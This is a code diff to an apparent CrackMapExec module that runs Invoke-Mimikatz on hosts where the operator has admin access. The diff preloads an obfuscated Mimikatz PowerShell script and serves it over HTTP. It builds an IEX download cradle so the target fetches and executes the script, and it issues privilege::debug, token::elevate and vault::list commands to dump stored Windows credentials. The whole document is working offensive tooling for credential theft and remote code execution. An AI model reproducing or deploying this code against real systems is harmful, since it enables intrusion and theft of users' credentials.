@@ -19,6 +19,8 @@ class CMEModule:
         '''
         '''
 
+        self.ps_script = obfs_ps_script('powersploit/Exfiltration/Invoke-Mimikatz.ps1')
+
     def on_admin_login(self, context, connection):
         command = "Invoke-Mimikatz -Command 'privilege::debug"
         users = []
@@ -36,7 +38,7 @@ class CMEModule:
             command += ' "token::elevate /user:{}" vault::list'.format(user)
         command += " exit'"
 
-        launcher = gen_ps_iex_cradle(context.server, context.localip, context.server_port, 'Invoke-Mimikatz.ps1', command)
+        launcher = gen_ps_iex_cradle(context, 'Invoke-Mimikatz.ps1', command)
         ps_command = create_ps_command(launcher)
 
         connection.execute(ps_command)
@@ -47,9 +49,7 @@ class CMEModule:
             request.send_response(200)
             request.end_headers()
 
-            with open(get_ps_script('Invoke-Mimikatz.ps1'), 'r') as ps_script:
-                ps_script = obfs_ps_script(ps_script.read())
-                request.wfile.write(ps_script)
+            request.wfile.write(self.ps_script)
 
         else:
             request.send_response(404)
